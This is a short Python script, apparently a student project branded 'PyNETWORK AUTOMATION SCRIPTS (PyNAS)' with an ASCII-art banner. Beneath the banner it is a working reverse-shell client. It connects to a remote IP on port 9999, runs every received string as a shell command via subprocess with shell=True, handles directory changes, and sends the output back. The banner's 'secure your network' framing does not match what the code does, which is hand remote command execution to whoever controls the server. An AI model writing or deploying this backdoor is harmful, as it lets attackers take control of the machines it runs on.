
import socket                       # way of connecting two nodes on a network to communicate with each other.
import os                           # module in Python provides functions for interacting with the operating system.
import subprocess                   # module allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
from colored import fg, attr        # Python library for color and formatting in terminal.


reset = attr('reset')

s = socket.socket()         # Creating socket instance


c107 = fg(107)
print(c107 + "WELCOME TO PyNETWORK AUTOMATION SCRIPTS (PyNAS)")
print("-----------------------------------------------\n\n")



print("   **********                     ***         ***       ***          *********         ")
print("   ************                   ****        ***      ******       ************       ")
print("   ***      ****                  *****       ***     ***  ***     ****       ***      ")
print("   ***      ****                  ******      ***    ***    ***    ***                 ")
print("   ***      ****                  *** ***     ***   ***      ***   ****                ")
print("   ***     ****                   ***  ***    ***  **************  ***********         ")
print("   **********  ***           ***  ***   ***   ***  **************    ***********       ")
print("   ********     ***         ***   ***    ***  ***  ***        ***            ****      ")
print("   ***           ***       ***    ***     *** ***  ***        ***             ***      ")
print("   ***            ***     ***     ***      ******  ***        ***  ***       ****      ")
print("   ***             ****  ***      ***       *****  ***        ***   ************       ")
print("   ***               ******       ***        ****  ***        ***    *********         ")
print("                       ***                                                             ")
print("                      ***                                                              ")
print("                     ***            ,--------------------------------------------,     ")
print("                    ***             | AUTHORS:-- HRISHIKESH RANE & SIDHESH PARAB |     ")
print("                   ***              *--------------------------------------------*     ")


print("\nHAVE A LOOK INTO YOUR NETWORK & SECURE IT.")
print("-------------------------------------------\n" + reset)

host = input("Enter Remote Peer Server IP Address : ")
port = 9999
s.connect((host, port))

while True:
    data = s.recv(20480)
    if data[:2].decode("utf-8") == 'cd':            # If command passed is for changing directory.
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + ">"                       # If for all other system commands
        s.send(str.encode(output_str + currentWD))
        print(output_str)



